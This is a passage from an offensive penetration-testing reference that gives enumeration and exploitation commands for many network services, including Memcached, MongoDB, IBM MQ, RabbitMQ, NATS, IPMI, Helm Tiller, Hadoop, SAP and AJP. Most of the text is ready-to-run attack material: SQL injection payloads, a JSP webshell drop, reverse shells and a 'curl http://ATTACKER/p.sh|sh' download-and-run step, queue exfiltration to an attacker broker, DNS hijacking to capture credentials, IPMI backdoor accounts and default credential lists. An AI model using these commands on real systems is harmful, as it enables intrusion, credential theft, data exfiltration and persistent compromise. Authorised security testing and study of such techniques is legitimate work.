# \l \du list dbs/users; svv_redshift_sessions and pg_user enumerate identities
psql "host=<endpoint> user=<u> dbname=dev sslmode=require" -c 'select * from pg_user;'
# Bad-password vs missing-user errors differ -> username enumeration during spraying
```

### Exploitation / Attacks
```bash
# IAM auth: mint short-lived creds if you hold IAM keys with redshift:GetClusterCredentials
aws redshift get-cluster-credentials --cluster-identifier <id> --db-user pentest --db-name dev --duration-seconds 900
psql "host=<endpoint> user=pentest password=<token> dbname=dev sslmode=require"

# Master user (often awsuser) can COPY from attacker S3, UNLOAD to exfil, and run Python UDFs (in-cluster code exec, legacy clusters)
```
```python
# Driver metadata SQLi (CVE-2024-12744/5/6): unquoted user input in getTables/getSchemas/getColumns
import redshift_connector
cur = redshift_connector.connect(host='<endpoint>', database='dev', user='lowpriv', password='pw').cursor()
cur.get_tables(table_schema='public', table_name_pattern="%' UNION SELECT usename,passwd FROM pg_user--")
```

### Notable CVEs
- CVE-2024-12744 / -12745 / -12746: Redshift JDBC 2.1.0.31, Python connector 2.1.4, ODBC 2.1.5.0 build metadata queries with unquoted user-controlled catalog/pattern args; an app that passes attacker input into the metadata API runs arbitrary SQL as the connector's DB user.

---

## HSQLDB default sa login to Java-routine RCE (port 9001)

HSQLDB (HyperSQL) is a Java SQL database; in server mode it listens on 9001/TCP. It is usually found bound to localhost after another service is popped, so treat it as a privesc pivot. Default creds are `sa` with a blank password, and HSQLDB lets you register Java Language Routines that call arbitrary static JDK methods, which turns SQL access into file read/write and code execution.

### Enumeration
```bash
# nmap labels it "HSQLDB JDBC"
nmap -sV -p9001 <IP>

# Hunt for the DB name + creds in any code you already have on the host
grep -rP 'jdbc:hsqldb.*password.*' /path/to/search

# Connect with the bundled Java client (extract hsqldb.jar, run SqlTool or the GUI)
java -jar hsqldb.jar   # connect URL: jdbc:hsqldb:hsql://<IP>/<DBNAME>  user sa, blank pass
```

### Exploitation / Attacks
```sql
-- Read Java system properties by mapping java.lang.System.getProperty as a function
CREATE FUNCTION getsystemproperty(IN key VARCHAR) RETURNS VARCHAR LANGUAGE JAVA
  DETERMINISTIC NO SQL EXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty';
VALUES(getsystemproperty('user.name'));

-- Write a file to disk via a JDK gadget already on the classpath (max 1024 bytes)
CREATE PROCEDURE writetofile(IN path VARCHAR, IN data VARBINARY(1024))
  LANGUAGE JAVA DETERMINISTIC NO SQL EXTERNAL NAME
  'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename';
-- hex-encode a JSP/JSP webshell payload and drop it under a served path
CALL writetofile('/path/ROOT/shell.jsp', CAST ('3c254020...' AS VARBINARY(1024)));
```
Any static JDK method returning an SQL-compatible primitive can be wrapped as a `FUNCTION` (called with `VALUES`); void methods become a `PROCEDURE` (called with `CALL`). The class must already be on the app classpath.

---

## Memcached unauthenticated cache dump (port 11211)

Memcached is a distributed in-memory key/value cache on 11211. It supports SASL but is almost always exposed with no auth, so anyone who reaches the port can list slabs, enumerate keys, and read cached data (session tokens, query results, credentials). Data is volatile, so dump promptly.

### Enumeration
```bash
# Raw protocol over nc: version, stats, slabs, and per-slab item counts
echo "version"      | nc -vn -w1 <IP> 11211
echo "stats"        | nc -vn -w1 <IP> 11211
echo "stats slabs"  | nc -vn -w1 <IP> 11211
echo "stats items"  | nc -vn -w1 <IP> 11211

# libmemcached-tools: cleaner enumeration
memcstat --servers=<IP>            # stats
memcdump --servers=<IP>            # dump all key names

# nmap + msf
nmap -sV --script memcached-info -p 11211 <IP>
msf6 > use auxiliary/gather/memcached_extractor   # pulls saved data
```

### Exploitation / Attacks
```bash
# Legacy (<1.4.31): dump keys per slab class, then GET each key
echo "stats cachedump <slab_class> 0" | nc -vn -w1 <IP> 11211   # 0 = unlimited
echo "get <item_name>"                | nc -vn -w1 <IP> 11211

# Modern (1.4.31+): non-blocking full key metadump
echo 'lru_crawler metadump all' | nc <IP> 11211

# Bulk read discovered keys
memccat --servers=<IP> <key1> <key2> <key3>

# Poison cache entries (write attacker data) to influence downstream apps
printf 'set session_admin 0 3600 4\r\ntrue\r\n' | nc -vn -w1 <IP> 11211
```

### Notable CVEs
- CVE-2018-1000115: exposed UDP/11211 allows massive reflection/amplification DDoS (Memcrashed). Confirm with `msf auxiliary/scanner/memcached/memcached_amp`; disable UDP or firewall the port.

---

## MongoDB unauthenticated access and enumeration (port 27017)

MongoDB is a document NoSQL store on 27017/27018 that by default requires no password, so the first test is always an anonymous connection. For NoSQL operator/injection payloads against apps talking to Mongo, see [[nosql]]; this section focuses on direct unauthenticated access, enumeration, and the no-auth default.

### Enumeration
```bash
# Anonymous connection (mongo legacy or mongosh)
mongosh mongodb://<IP>:27017
mongo <IP>:<PORT>/<DB>

# nmap runs all mongo scripts by default; mongodb-brute checks if creds are needed
nmap -sV --script "mongo* and default" -p 27017 <IP>
nmap -n -sV --script mongodb-brute -p 27017 <IP>
```
```python
from pymongo import MongoClient
client = MongoClient("<IP>", 27017)      # no creds
print(client.server_info())
for db in client.list_databases():
    print(db["name"], client[db["name"]].list_collection_names())
```

### Exploitation / Attacks
```javascript
// Once connected, enumerate and dump collections
show dbs
use <db>
show collections
db.<collection>.find()          // dump every document
db.users.find({"username":"admin"})

// admin is a common DB; if reachable, dump credentials/tokens stored there
```
```bash
# If auth is enabled but you have root on the host, disable it and reconnect free
# set noauth = true (or remove security.authorization) in mongod.conf / bitnami mongodb.conf, then restart
grep "noauth.*true" /opt/bitnami/mongodb/mongodb.conf | grep -v "^#"

# Predictable 12-byte ObjectIDs (timestamp+machine+pid+counter) enable IDOR guessing
# https://github.com/andresriancho/mongo-objectid-predict
```

### Notable CVEs
- CVE-2025-14847 (MongoBleed): unauthenticated pre-auth heap memory disclosure in MongoDB 3.6 through 8.2 when the zlib network compressor is enabled. `OP_COMPRESSED` trusts an attacker-supplied `uncompressedSize`, so the server over-allocates and echoes uninitialized heap (creds, tokens) back in error responses; omitting the BSON `\x00` terminator makes the parser walk the oversized buffer. Check with `db.adminCommand({getParameter:1, networkMessageCompressors:1})`; PoC `joe-desimone/mongobleed`.

---

## IBM MQ message tampering and MQSC command execution (port 1414)

IBM MQ is a message broker exposing its native listener on 1414/TCP, often with an MQ Console / REST API on 9443 and Prometheus metrics on 9157. Beyond queues and channels, PCF/MQSC access lets you create a SERVICE that runs an OS command with `mqm` authority, so a reachable server-connection channel is a path to RCE. `punch-q` (wraps `pymqi`) drives it; the REST API on 9443 gives the same primitives over HTTPS.

### Enumeration
```bash
# punch-q (Docker) discovers queue-manager name, channels, users
sudo docker run --rm -ti leonjza/punch-q --host <IP> --port 1414 discover name
sudo docker run --rm -ti leonjza/punch-q --host <IP> --port 1414 --username admin --password passw0rd discover channels
# some instances accept UNAUTHENTICATED MQ requests -> drop --username/--password
sudo docker run --rm -ti leonjza/punch-q --host <IP> --port 1414 discover users --channel DEV.ADMIN.SVRCONN

# If 1414 is filtered, try the web console/REST on 9443 (MQWebAdmin for /admin, MQWebUser for /messaging)
# CHLAUTH recon via REST to see how a remote user maps to MCAUSER
curl -sku 'admin:passw0rd' -H 'ibm-mq-rest-csrf-token: x' -H 'Content-Type: text/plain;charset=utf-8' \
  --data "DISPLAY CHLAUTH(DEV.ADMIN.SVRCONN) MATCH(RUNCHECK) CLNTUSER('admin') ADDRESS('10.10.10.10')" \
  https://<IP>:9443/ibmmq/rest/v3/admin/action/qmgr/MYQUEUEMGR/mqsc
```

### Exploitation / Attacks
```bash
# Non-destructive message sniff / dump from queues (business data, creds)
sudo docker run --rm -ti leonjza/punch-q --host <IP> --port 1414 -u admin -p passw0rd --channel DEV.ADMIN.SVRCONN messages dump

# RCE: punch-q creates a SERVICE (StartCommand) -> runs an arbitrary program as mqm (async)
sudo docker run --rm -ti leonjza/punch-q --host <IP> --port 1414 -u admin -p passw0rd --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/sh" --args "-c id"
sudo docker run --rm -ti leonjza/punch-q --host <IP> --port 1414 -u admin -p passw0rd --channel DEV.ADMIN.SVRCONN command reverse -i <ATTACKER> -p 4444

# Same RCE over the 9443 REST API with DEFINE/START/DELETE SERVICE
curl -sku 'admin:passw0rd' -H 'ibm-mq-rest-csrf-token: x' -H 'Content-Type: text/plain;charset=utf-8' \
  --data "DEFINE SERVICE(HT) CONTROL(MANUAL) SERVTYPE(COMMAND) STARTCMD('/bin/sh') STARTARG('-c id >/tmp/mq.id')" \
  https://<IP>:9443/ibmmq/rest/v3/admin/action/qmgr/MYQUEUEMGR/mqsc

# Message theft/injection via the messaging REST API (no MQ client libs needed)
curl -sku 'app:passw0rd' https://<IP>:9443/ibmmq/rest/v3/messaging/qmgr/MYQUEUEMGR/queue/DEV.QUEUE.1/message           # browse
curl -sku 'app:passw0rd' -X DELETE -H 'ibm-mq-rest-csrf-token: x' https://<IP>:9443/.../queue/DEV.QUEUE.1/message      # destructive get
```
Loot CCDT/TLS client artifacts (`AMQCLCHL.TAB`, `mqclient.ini`, `*.kdb`, `*.sth`, `*.p12`, `MQCCDTURL`) from app servers/CI when channels demand SSL. Note default developer creds `admin:passw0rd` / `app:passw0rd` on the container image.

---

## MQTT (Mosquitto) broker topic sniffing and cross-tenant abuse (port 1883)

MQTT is a lightweight IoT publish/subscribe protocol; Mosquitto brokers listen on 1883 (8883 for TLS). Authentication is optional and encryption is off by default, so a wildcard subscription (`#`) on an open broker taps every topic, and weak per-tenant topic ACLs let you publish to or read other tenants' devices.

### Enumeration
```bash
# Subscribe to everything (open broker) and to broker internals
mosquitto_sub -h <IP> -t "#"      -v      # all application topics
mosquitto_sub -h <IP> -t '$SYS/#' -v      # broker stats/version

# With creds (spray weak defaults: admin/admin, admin: empty, reused tokens)
mosquitto_sub -h <IP> -p 1883 -V mqttv311 -i cid -u <user> -P <pass> -t "#" -v
```
No dedicated nmap enum beyond banner; CONNACK return code 0x00 = accepted, 0x05 = bad creds. `mqtt-pwn` / paho scripts automate connect-and-subscribe.

### Exploitation / Attacks
```bash
# Cross-tenant control when ACLs are namespaced only by deviceId
mosquitto_pub -h <IP> -V mqttv311 -u <user> -P <pass> \
  -t "/ys/<victimDeviceId>/tx" \
  -m '{"method":"Device.setState","params":{"state":{"power":"on"}}}'

# Sparkplug B (OT/SCADA) passive recon: live node/device/metric map from birth traffic
mosquitto_sub -h <IP> -p 1883 -t 'spBv1.0/#' -v
mosquitto_sub -h <IP> -p 1883 -t 'STATE/#'   -v
```
MQTT is frequently reachable over WebSocket (`ws://`/`wss://` on paths like `/mqtt`, `/ws`, RabbitMQ `15675/ws`). Grep frontend bundles (`env.js`, main JS chunk) for `mqtt`, `wss://`, `clientId`, `username`, `password`, `token`; then test wildcard subscribe (`client/+/chat_session`, `client/#`) for a cross-tenant message tap using the npm `mqtt` client.

---

## AMQP / RabbitMQ broker enumeration, message hijack, and RCE sinks (ports 5671/5672)

AMQP 0-9-1/1.0 is the RabbitMQ broker protocol on 5672 (5671 TLS); the HTTP management API sits on 15672. Default creds are `guest:guest` (loopback-only by default, but many Docker/IoT images disable that check). With any authenticated access you can sniff/replay messages, exfiltrate via a shovel, and if a downstream consumer feeds message bodies into a shell you get RCE.

### Enumeration
```bash
nmap -sV -Pn -n -T4 -p 5672 --script amqp-info <IP>   # product/version/SASL mechanisms

# Probe AMQPS cert chain + mutual-TLS requirement
openssl s_client -alpn amqp -connect <IP>:5671 -tls1_3 -msg </dev/null

# rabbitmqadmin v2 against the mgmt API on 15672
rabbitmqadmin --host <IP> --port 15672 -u guest -p guest channels list --non-interactive
```
```python
import amqp
conn = amqp.connection.Connection(host="<IP>", port=5672, virtual_host="/")  # guest:guest default
conn.connect(); print("SASL:", conn.mechanisms); print(conn.server_properties)
```

### Exploitation / Attacks
```python
# Silent message sniffing: bind a temp queue to a topic exchange with a broad routing key
import pika
ch = pika.BlockingConnection(pika.ConnectionParameters('<IP>',5672,'/',pika.PlainCredentials('user','pass'))).channel()
ch.queue_declare(queue='loot', exclusive=True, auto_delete=True)
ch.queue_bind(queue='loot', exchange='amq.topic', routing_key='#')     # or payments.*, audit.#
for m,p,body in ch.consume('loot', inactivity_timeout=5):
    if body: print(m.routing_key, body)
# Stream queues (x-queue-type=stream) retain history: replay with arguments={'x-stream-offset':'first'}
```
```bash
# Exfiltrate a queue to an attacker broker via a shovel
rabbitmqadmin shovels declare_amqp091 --name loot \
  --source-uri amqp://user:pass@<IP>:5672/%2f --destination-uri amqp://attacker:pw@vps:5672/%2f \
  --source-queue transactions --destination-queue stolen

# Consumer-side command injection: publish a probe if a worker runs message bodies (bash -c "$MSG")
curl -u user:pass -H 'content-type: application/json' -X POST \
  http://<IP>:15672/api/exchanges/%2F/amq.default/publish \
  -d '{"properties":{},"routing_key":"update","payload":"id","payload_encoding":"string"}'
```

### Notable CVEs
- CVE-2024-51988: RabbitMQ <= 3.12.10 skips the `configure` permission check on HTTP-API queue deletion; any authed user with only `read`/`write` on a vhost can delete arbitrary queues (DoS). `curl -k -u u:p -X DELETE https://<IP>:15672/api/queues/%2F/<queue>`.
- CVE-2025-50200: RabbitMQ before 4.0.8/4.1.0 logs the full `Authorization` header (base64) when the mgmt API is hit with basic auth on a non-existent resource; with filesystem access, grep `/var/log/rabbitmq/rabbit@*.log` for `Authorization:` to recover other tenants' creds.

---

## NATS / JetStream plaintext credential capture and stream looting (port 4222)

NATS is a high-performance text-protocol message bus on 4222/TCP. The server sends an `INFO {...}` JSON banner on connect; the client replies with a plaintext `CONNECT {"user":...,"pass":...}` frame. TLS and auth are optional, so internal deployments commonly run plaintext AUTH, and JetStream (persistent Streams) often retains log payloads containing credentials.

### Enumeration
```bash
# Banner grab: version, auth_required, jetstream, tls_required
nmap -p4222 -sV --script banner <IP>
echo | nc <IP> 4222        # prints the INFO {...} line manually

# Official CLI (go install github.com/nats-io/natscli/nats@latest)
nats -s nats://<IP>:4222 rtt          # Authorization Violation if creds needed
```

### Exploitation / Attacks
```bash
# Plaintext CONNECT harvesting: if you can hijack the broker DNS name (stale AD record, dynamic-update ACL),
# mirror the real INFO banner to every client and capture the user/pass frame with nc alone
nsupdate <<< $'server <DC_IP>\nupdate add nats-svc.domain.local 60 A <ATTACKER_IP>\nsend'
nc <REAL_NATS> 4222 | head -1 | nc -lnvp 4222   # replayed banner -> client sends plaintext CONNECT

# With a recovered credential, loot JetStream streams (auth logs frequently hold plaintext AD creds)
nats context add ctx -s nats://<IP>:4222 --user Dev_Account_A --password '<pass>'
nats stream list --context ctx
nats stream view logs.auth --context ctx     # {"user":"...","password":"...","ip":"..."}
```
Replay recovered AD creds against Kerberos-only services, e.g. `netexec smb <DC> -u USER -p PASS -k`, for lateral movement / domain compromise.

## IPMI / BMC out-of-band hash disclosure and cipher-zero bypass (port 623/udp)

IPMI is the out-of-band management plane on server Baseboard Management Controllers (BMC: iLO, iDRAC, IMM, ILOM, Supermicro). It runs on 623/udp (sometimes tcp) below the OS, so owning it means KVM/serial console, virtual media, and a persistent backdoor account independent of the host OS. High-value pivot: BMC compromise leads to host root via GRUB `init=/bin/sh` or virtual-CD rescue boot.

### Enumeration
```bash
# Discover + fingerprint version
nmap -n -sU -p 623 --script ipmi-version 10.0.0.0/24
msfconsole -qx "use auxiliary/scanner/ipmi/ipmi_version; set RHOSTS 10.0.0.0/24; run; exit"
```

### Exploitation / Attacks
```bash
# RAKP hash disclosure: dump salted MD5/SHA1 password hash for any valid user, crack offline
msfconsole -qx "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS 10.0.0.22; run; exit"
hashcat -m 7300 ipmi_rakp.hash rockyou.txt        # 7300 = IPMI2 RAKP HMAC-SHA1

# Cipher-zero auth bypass: authenticate with ANY password against a valid user
msfconsole -qx "use auxiliary/scanner/ipmi/ipmi_cipher_zero; set RHOSTS 10.0.0.22; run; exit"
apt-get install ipmitool
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P anything user list
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P anything user set password 2 NewPass1

# Anonymous access (null user/pass default on many BMCs) -> reset a named account
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user set password 2 NewPass1

# Post-access: plant a persistent ADMINISTRATOR backdoor over the local interface (no auth)
ipmitool user set name 4 backdoor; ipmitool user set password 4 backdoor; ipmitool user priv 4 4

# Supermicro: clear-text creds stored on the BMC filesystem
cat /nv/PSBlock /nv/PSStore
```
Default creds to try first: Dell iDRAC `root:calvin`, IBM IMM `USERID:PASSW0RD` (zero), Supermicro `ADMIN:ADMIN`, Oracle/Sun ILOM `root:changeme`, ASUS `admin:admin`. HP iLO randomizes an 8-char factory password (not static). See [[default-credentials]].

### Notable CVEs
- CVE-2013-4786: IPMI 2.0 RAKP protocol returns a salted password hash for any known username pre-auth, enabling offline cracking. Affects the IPMI 2.0 spec broadly (HP, Dell, Supermicro BMCs).
- Cipher Zero auth bypass (Dan Farmer, no single CVE): IPMI 2.0 cipher suite 0 accepts any password for a valid user; found across HP/Dell/Supermicro BMCs.
- CVE-2013-3623 / Supermicro UPnP (Intel SDK for UPnP 1.3.1) SSDP overflow on udp/1900 gives root on the BMC (`exploit/multi/upnp/libupnp_ssdp_overflow`).

---

## Helm 2 Tiller unauthenticated cluster-admin RCE (port 44134)

Tiller is the in-cluster server component of Helm 2, listening on 44134/tcp, usually deployed in `kube-system` with a high-privilege service account and no authentication. Any pod (or reachable client) that can talk to Tiller can install a chart that grants the default service token cluster-admin, giving full Kubernetes cluster takeover. Cross-ref [[kubernetes-attacks]].

### Enumeration
```bash
# From inside a compromised pod: find the Tiller service across namespaces
kubectl get pods,services --all-namespaces | grep -i tiller
kubectl get services -n kube-system | grep tiller     # tiller-deploy ... 44134/TCP

# From the network
nmap -sS -p 44134 <IP>

# Talk to it with the Helm 2 client and confirm reachability
helm --host tiller-deploy.kube-system:44134 version
```

### Exploitation / Attacks
```bash
# Install a chart that binds the default service account to cluster-admin
git clone https://github.com/Ruil1n/helm-tiller-pwn
helm --host tiller-deploy.kube-system:44134 install --name pwnchart helm-tiller-pwn

# The chart's clusterrole.yaml + clusterrolebinding.yaml give ALL privileges to the
# default token; now enumerate/read secrets/exec into any pod cluster-wide
kubectl get secrets --all-namespaces
kubectl auth can-i --list
```
No installed CLI beyond `helm`/`kubectl` is needed. From here pivot to reading every namespace's secrets and stealing service-account tokens ([[kubernetes-attacks]]).

### Notable CVEs
No dedicated CVE. This is a design exposure: Helm 2 Tiller ran without auth by default and was deprecated. Helm 3 removed Tiller entirely, so a 44134 listener implies an unmaintained Helm 2 install.

---

## Apache Hadoop unauthenticated WebHDFS/YARN RCE (ports 50070/9870, 8088)

Hadoop is a distributed storage (HDFS) and compute (YARN/MapReduce) cluster. In the default config it runs with `security=off` (no authentication), so exposed web UIs and REST APIs allow arbitrary HDFS file read/write and full RCE via YARN job submission. Classic cryptominer target; treat any unauth Hadoop as cluster RCE.

### Enumeration
```bash
# NSE scripts per port (Hadoop lacks a Metasploit module)
nmap -p 50030 --script hadoop-jobtracker-info <IP>
nmap -p 50070 --script hadoop-namenode-info <IP>       # NameNode / WebHDFS
nmap -p 50075 --script hadoop-datanode-info <IP>
nmap -p 50090 --script hadoop-secondary-namenode-info <IP>
# Ports: 50070/9870 NameNode, 50075/9864 DataNode, 8088 YARN RM, 8042 NodeManager,
#        8031/8032 YARN RPC (often still unauth), 14000 HttpFS
```

### Exploitation / Attacks
```bash
# WebHDFS arbitrary read/write by impersonating any user via user.name
curl "http://<host>:50070/webhdfs/v1/?op=LISTSTATUS&user.name=hdfs"
curl -L "http://<host>:50070/webhdfs/v1/etc/hadoop/core-site.xml?op=OPEN&user.name=hdfs"
curl -X PUT -T ./payload \
  "http://<host>:50070/webhdfs/v1/tmp/payload?op=CREATE&overwrite=true&user.name=hdfs"

# YARN ResourceManager unauth RCE: submit a DistributedShell job running any command
appid=$(curl -s -X POST http://<host>:8088/ws/v1/cluster/apps/new-application | \
  python3 -c 'import sys,json;print(json.load(sys.stdin)["application-id"])')
curl -s -X POST http://<host>:8088/ws/v1/cluster/apps -H 'Content-Type: application/json' -d '{
  "application-id":"'"$appid"'","application-name":"pwn","application-type":"YARN",
  "am-container-spec":{"commands":{"command":"/bin/bash -c \"curl http://ATTACKER/p.sh|sh\""}}}'
# 8031/8032 RPC allow the same protobuf job submission unauth on older clusters -> RCE
```

### Notable CVEs
- CVE-2023-26031: Hadoop 3.3.1-3.3.4 `container-executor` loads libs from a relative RUNPATH (`$ORIGIN/:../lib/native/`); a YARN-container user drops a malicious `libcrypto.so` and gets root when the SUID binary runs. Fixed 3.3.5. Check: `readelf -d /opt/hadoop/bin/container-executor | grep 'R.\?PATH'` and confirm SUID with `ls -l`.

---

## SAP NetWeaver / ERP default creds, SOAP RFC and ICM abuse (ports 3200-3300, 50000, 1128/1129)

SAP is the ERP stack (NetWeaver ABAP/Java). Each instance splits into database, application and presentation layers; the database yields the most impact. Attack surface: SAP GUI (DIAG protocol, often unencrypted), the ICM/Web Dispatcher HTTP stack on 50000+, SAP Host Agent SOAP on 1128/1129, and the `/sap/bc/soap/rfc` service. Instance-number ports follow `32<NR>` dispatcher, `33<NR>` gateway, `5<NR>13`/`5<NR>14` sapstartsrv.

### Enumeration
```bash
# Service/instance discovery
msfconsole -qx "use auxiliary/scanner/sap/sap_service_discovery; set RHOSTS 192.168.96.101; run; exit"
nmap -sV -p 3200-3300,50000-50100,1128,1129 <IP>

# Unauth info disclosure (system id, kernel, DB, IP) -> build attack graph before login
curl http://<IP>:50000/sap/public/info                          # RFC_SYSTEM_INFO SOAP dump
curl "http://<IP>:1128/SAPHostControl/?wsdl"                     # Host Agent SOAP methods
msfconsole -qx "use auxiliary/scanner/sap/sap_icf_public_info; set RHOSTS <IP>; run; exit"
# ERPScan / pysap for custom NI/DIAG/RFC packet work
git clone https://github.com/OWASP/pysap
```

### Exploitation / Attacks
```bash
# Default hardcoded creds (P1 on prod) - try first in SAP GUI / SOAP RFC
#   SAP*:06071992  SAP*:PASS   DDIC:19920706   TMSADM:PASSWORD   EARLYWATCH:SUPPORT
#   SOLMAN_ADMIN:init1234   SAPCPIC:ADMIN
msfconsole -qx "use auxiliary/scanner/sap/sap_soap_rfc_brute_login; set RHOSTS <IP>; run; exit"

# SOAP RFC command execution when the user is over-privileged
msfconsole -qx "use exploit/multi/sap/sap_soap_rfc_sxpg_command_exec; set RHOSTS <IP>; run; exit"

# ConfigServlet unauth RCE (old but common on SAP Portal / Java stack)
curl "http://<IP>:50000/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=id"

# Data extraction / file existence via SOAP RFC modules
msfconsole -qx "use auxiliary/scanner/sap/sap_soap_rfc_read_table; set RHOSTS <IP>; run; exit"

# Lateral movement: trusted RFC jump from SM59 stored destinations reusing the same
# admin id in a compromised source system opens the trusting target with remote privs.
```
Post-login: check tcodes SU01/SM59/RSPFPAR; weak params (`login/min_password_lng<8`, `snc/enable=0`, `gw/reg_no_conn_info<255`) validated with [SAPPV](https://github.com/damianStrojek/SAPPV). Reachable SAProuter -> pivot (see next section).

### Notable CVEs
No single canonical CVE here; the reliable wins are default creds, ConfigServlet RCE, and SOAP RFC `SXPG_COMMAND_EXECUTE`/`SXPG_CALL_SYSTEM` command injection when the RFC user is over-privileged. RFC callback abuse hinges on `rfc/callback_security_method` not enforcing an allowlist.

---

## SAProuter perimeter pivot and admin-command bypass (port 3299)

SAProuter is a reverse proxy fronting internal SAP networks, commonly exposed on 3299/tcp through the perimeter firewall. It is an ideal pivot: map internal hosts/services through it, then tunnel Metasploit SAP modules to the internal landscape. Cross-ref [[pivoting-tunneling]].

### Enumeration
```bash
nmap -sV -p 3299 <IP>                      # saprouter?; banner leaks "SAProuter <ver> on '<host>'"
msfconsole -qx "use auxiliary/scanner/sap/sap_router_info_request; set RHOSTS <IP>; run; exit"
# Probe internal hosts/services and infer ACLs through the router
msfconsole -qx "use auxiliary/scanner/sap/sap_router_portscanner; set RHOSTS <IP>; set INSTANCES 00-50; set PORTS 32NN; run; exit"
```

### Exploitation / Attacks
```bash
# Pivot: run SAP modules through the router as a proxy (NI/SOCKS)
msfconsole -qx "use auxiliary/scanner/sap/sap_hostctrl_getcomputersystem; \
  set Proxies sapni:<ROUTER_IP>:3299; set RHOSTS 192.168.1.18; run; exit"

# CVE-2022-27668 remote admin bypass via pysap: loopback tunnel to 0.0.0.0 then admin packet
git clone https://github.com/OWASP/pysap && cd pysap
python router_portfw.py -d <ROUTER_IP> -p 3299 -t 0.0.0.0 -r 3299 -a 127.0.0.1 -l 3299 -v
python router_admin.py -s -d 127.0.0.1 -p 3299          # e.g. stop the remote router
```

### Notable CVEs
- CVE-2022-27668 (CVSS 9.8, SAP Note 3158375): permissive `saprouttab` entries let an unauthenticated remote attacker tunnel to the router loopback via the 0.0.0.0 address and send administration packets (shutdown/trace/connection-kill) even without the `-X` remote-admin flag. Affects standalone SAProuter 7.22/7.53 and kernels 7.49/7.77/7.81/7.85-7.88. Fix: patch + remove `*` wildcards from `P`/`S` lines.

---

## iSCSI unauthenticated block-storage target mount (port 3260)

iSCSI carries SCSI commands over TCP to give initiators block-level access to remote storage targets (SAN). When a target has no CHAP authentication (`AuthMethod None`), an attacker can discover, log in, and mount the raw block device, reading whole filesystems, VM disks, or database volumes offline.

### Enumeration
```bash
# Nmap reports whether authentication is required
nmap -sV --script=iscsi-info -p 3260 <IP>

# Discover target IQNs behind the portal (may reveal internal/alternate IPs)
sudo apt install open-iscsi
iscsiadm -m discovery -t sendtargets -p <IP>:3260
#   <IP>:3260,1 iqn.1992-05.com.emc:fl1001433000190000-3-vnxe

# Inspect a target's negotiated params (note auth.authmethod = None means no CHAP)
iscsiadm -m node --targetname="iqn...vnxe" -p <IP>:3260
```

### Exploitation / Attacks
```bash
# Log in to an unauthenticated target, then the block device appears as /dev/sdX
iscsiadm -m node --targetname="iqn.1992-05.com.emc:fl1001...-vnxe" -p <IP>:3260 --login
lsblk                                              # find the new device
sudo mount -o ro /dev/sdX1 /mnt/iscsi              # mount and loot filesystem
iscsiadm -m node --targetname="iqn...vnxe" -p <IP>:3260 --logout

# NAT/virtual-IP gotcha: discovery registers the internal IP. Rename the node dir under
# /etc/iscsi/nodes/<iqn>/ to the public IP and sed node.conn[0].address to it before login.
```
CHAP-protected targets: brute the shared secret (see brute-force notes) before mounting.

### Notable CVEs
No single headline CVE; the exposure is a target configured with `AuthMethod None` (or weak CHAP), reachable from an untrusted network. Shodan: `port:3260 AuthMethod`.

---

## TACACS+ shared-secret capture, offline crack and MitM bit-flip (port 49)

TACACS+ is Cisco's AAA protocol for centralized auth to routers/switches/NAS. Legacy TACACS+ on 49/tcp does not encrypt transport: the header is cleartext and the body is only MD5-obfuscated with the shared secret. Capture the traffic, crack the secret offline, and you can decrypt all AAA exchanges and log into the network gear. TCP/300 is TACACS+ over TLS (RFC 9887) and resists these attacks.

### Enumeration
```bash
nmap -sV -Pn -p 49,300 <IP>
# In a capture, the cleartext header (type/seq_no/session_id) lets you carve AAA flows:
tshark -r cap.pcap -Y "tcp.port == 49 || tcp.port == 300"
```

### Exploitation / Attacks
```bash
# Position with a MitM (ARP spoof, or TCP proxy/NAT in routed nets) to capture the exchange
# Convert a captured TACACS+ packet + device prompt to a hashcat hash, then crack offline
git clone https://github.com/GrrrDog/TacoTaco
python3 tac2cat.py -t 1 -m "Password: " -p <hex_stream_from_wireshark> > tacacs.hash
hashcat -m 16100 tacacs.hash rockyou.txt           # 16100 = TACACS+

# Once the secret is cracked, load it into Wireshark to decrypt usernames + AV pairs
# Active inline bypass without knowing the secret (legacy TACACS+ lacks integrity):
python3 tacoflip.py -t <TACACS_SERVER_IP>          # flip/replay authz/acct fields for auth bypass

# Faster path: recover the secret straight from device configs if you already have them
rg -n "tacacs|aaa group server|tacacs-server| key " *.cfg
#   look for legacy: tacacs-server host <ip> key <secret>
```

### Notable CVEs
No CVE; the weakness is protocol-inherent to legacy TACACS+ (cleartext header, keyed-MD5 body with no strong integrity). `tacoflip.py` MitM auth/authz bypass and offline secret cracking are the practical attacks. Mitigation is TACACS+ over TLS 1.3 (TCP/300).

---

## Apache JServ Protocol (AJP) Ghostcat LFI and trusted-attribute abuse (port 8009)

AJP/ajp13 is a binary protocol letting a front-end web server (Apache/Nginx) proxy to a Tomcat backend. The backend trusts the proxy to set internal request metadata, so an exposed 8009/tcp connector lets an attacker read `WEB-INF/web.xml` (Ghostcat LFI, often leaking creds) and forge trusted request attributes like `REMOTE_USER` and client-cert data. Reachable AJP is a high-value target, potentially RCE via Tomcat Manager.

### Enumeration
```bash
nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 <IP>
nmap -p 8009 --script ajp-request \
  --script-args 'path=/manager/html,method=GET,filename=ajp-manager.out' <IP>
```

### Exploitation / Attacks
```bash
# Ghostcat (CVE-2020-1938): read arbitrary WEB-INF files via include attributes
python2 ghostcat.py -u <IP> -p 8009 -f WEB-INF/web.xml        # exploit-db 48143
# Or craft ForwardRequest packets directly with AJPFuzzer
java -jar ajpfuzzer_v0.7.jar
#   connect <IP> 8009
#   forwardrequest 2 "HTTP/1.1" "/" 127.0.0.1 <IP> <IP> 8009 false "Cookie:x=1" \
#     "javax.servlet.include.path_info:/WEB-INF/web.xml,javax.servlet.include.servlet_path:/"
#   genericfuzz ... "secret:FUZZ" /tmp/ajp_secret_candidates.txt   # brute an AJP secret

# Reach Tomcat Manager through an AJP proxy -> deploy a WAR web shell = RCE
git clone https://github.com/dvershinin/nginx_ajp_module     # or a2enmod proxy_ajp:
